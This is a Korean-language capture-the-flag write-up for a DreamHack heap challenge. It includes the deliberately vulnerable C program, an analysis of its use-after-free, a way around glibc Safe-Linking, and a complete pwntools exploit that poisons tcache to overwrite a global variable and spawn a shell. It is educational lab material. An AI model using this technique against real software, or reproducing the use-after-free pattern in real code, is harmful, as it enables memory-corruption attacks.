---
ctf_name: "DreamHackWargame"
challenge_name: "Tcache-Poisoning-with-Safe-Linking"
category: "pwn"
difficulty: "medium"
author: "kjs24"
date: "2026-07-28"
points: 0
tags: [tcache poisoning, safe linking, UAF]
---

# Tcache-Poisoning-with-Safe-Linking

## 문제 설명

`malloc(0x10)`으로 노트를 생성하고 삭제하거나 수정할 수 있는 메뉴형 문제이다.
전역 변수 `target`을 0이 아닌 값으로 바꾼 뒤 4번 메뉴를 선택하면 셸을 획득할 수 있다.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

size_t target __attribute__((aligned(16)));
void *notes[3];
char note_deleted[3];

void menu()
{
    printf("1. create\n");
    printf("2. delete\n");
    printf("3. edit\n");
    printf("4. shell\n");
    printf("> ");
}

void create_note()
{
    int idx;
    printf("idx: ");
    scanf("%d", &idx);

    if (idx < 0 || idx > 2) {
        printf("idx out of range!\n");
        return;
    }

    note_deleted[idx] = 0;
    notes[idx] = malloc(0x10);
    printf("Note created at %p\n", notes[idx]);
}

void delete_note()
{
    int idx;
    printf("idx: ");
    scanf("%d", &idx);

    if (idx < 0 || idx > 2) {
        printf("idx out of range!\n");
        return;
    }

    if (!notes[idx]) {
        printf("No entry!\n");
        return;
    }

    if (note_deleted[idx]) {
        printf("No double free!\n");
        return;
    }

    note_deleted[idx] = 1;
    free(notes[idx]);
}

void edit_note()
{
    int idx;
    printf("idx: ");
    scanf("%d", &idx);

    if (idx < 0 || idx > 2) {
        printf("idx out of range!\n");
        return;
    }

    if (!notes[idx]) {
        printf("No entry!\n");
        return;
    }

    printf("Content: ");
    read(STDIN_FILENO, notes[idx], 8);
}

void test_target()
{
    if (target) {
        printf("Win\n");
        system("/bin/sh");
    }
    printf("No\n");
}
```

보호 기법은 다음과 같다.

```text
Arch:       amd64
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

## 풀이

### 취약점 분석

`delete_note()`는 청크를 해제한 뒤 `notes[idx]`를 `NULL`로 초기화하지 않는다.
한편 `edit_note()`는 `note_deleted[idx]`를 확인하지 않기 때문에 해제된 청크에도
8바이트를 쓸 수 있다. 따라서 Use-After-Free 취약점으로 tcache entry의 `next`
포인터를 조작할 수 있다.

또한 `create_note()`가 할당된 힙 주소를 출력하므로 Safe-Linking에 필요한 힙 주소도
알 수 있다. 바이너리가 PIE를 사용하지 않기 때문에 `target`의 주소는 고정되어 있다.

### Safe-Linking 우회

Safe-Linking이 적용된 tcache의 `next` 포인터는 다음과 같이 저장된다.

```text
encoded_next = (position >> 12) ^ next
```

여기서 `position`은 `next`가 저장되는 현재 tcache entry의 주소이고, `next`는 다음
청크의 주소이다. 따라서 해제할 청크의 주소를 `A`, 목표 주소를 `target`이라고 하면
UAF로 기록할 값은 다음과 같다.

```python
encoded_next = (A >> 12) ^ target
```

glibc 2.30부터 `tcache_get()`은 해당 bin의 count가 0보다 큰지도 검사한다. 청크를
하나만 넣고 `next`를 변조하면 첫 할당 후 count가 0이 되어 조작한 주소를 다시
할당받을 수 없다. 같은 크기의 청크 두 개를 해제해 count를 2로 만든 뒤 poisoning을
진행해야 한다.

`target`은 16바이트 정렬이 적용되어 있으므로 tcache의 정렬 검사도 통과한다.

### 익스플로잇 과정

1. 같은 크기의 청크 `A`, `B`를 생성하고 `A`의 주소를 저장한다.
2. `B`, `A` 순서로 해제해 tcache를 `A -> B`로 만들고 count를 2로 만든다.
3. UAF로 `A->next`를 `(A >> 12) ^ target`으로 덮어 tcache를 `A -> target`으로 만든다.
4. 두 번 할당해 두 번째 `malloc()`이 `target`을 반환하게 한다.
5. 반환된 `target`에 0이 아닌 값을 쓰고 4번 메뉴를 호출한다.

## 익스플로잇 코드

```python
from pwn import *

context.log_level = "debug"

# p = process("./main")
p = remote("host3.dreamhack.games", 23170)
elf = ELF("./main")

target = elf.symbols["target"]
log.info(f"target: {target:#x}")


def create(idx):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"idx: ", str(idx).encode())
    p.recvuntil(b"Note created at ")
    return int(p.recvline().strip(), 16)


def delete(idx):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"idx: ", str(idx).encode())


def edit(idx, data):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"idx: ", str(idx).encode())
    p.sendafter(b"Content: ", data)


# 두 청크를 준비한다.
chunk_a = create(0)
create(1)
log.info(f"chunk A: {chunk_a:#x}")

# LIFO 순서에 따라 A가 tcache의 head가 되도록 해제한다.
delete(1)
delete(0)

# A -> target이 되도록 Safe-Linking이 적용된 next 값을 기록한다.
encoded_next = (chunk_a >> 12) ^ target
log.info(f"encoded next: {encoded_next:#x}")
edit(0, p64(encoded_next))

# 첫 번째 할당은 A, 두 번째 할당은 target을 반환한다.
create(0)
allocated = create(1)
log.info(f"poisoned allocation: {allocated:#x}")
assert allocated == target

# notes[1]이 target을 가리키므로 target을 0이 아닌 값으로 변경한다.
edit(1, p64(1))

p.sendlineafter(b"> ", b"4")
p.interactive()
```

## 플래그

```text
DH{REDACTED}
```

## 배운 점

tcache poisoning을 수행할 때 Safe-Linking으로 인코딩된 `next` 값을 만드는 방법과
tcache count 검사를 통과하기 위해 bin에 충분한 수의 청크를 넣어야 한다는 점을
확인했다. 주소 누수가 제공되면 Safe-Linking이 적용되어 있어도 목표 주소에 맞는
포인터를 계산할 수 있다.
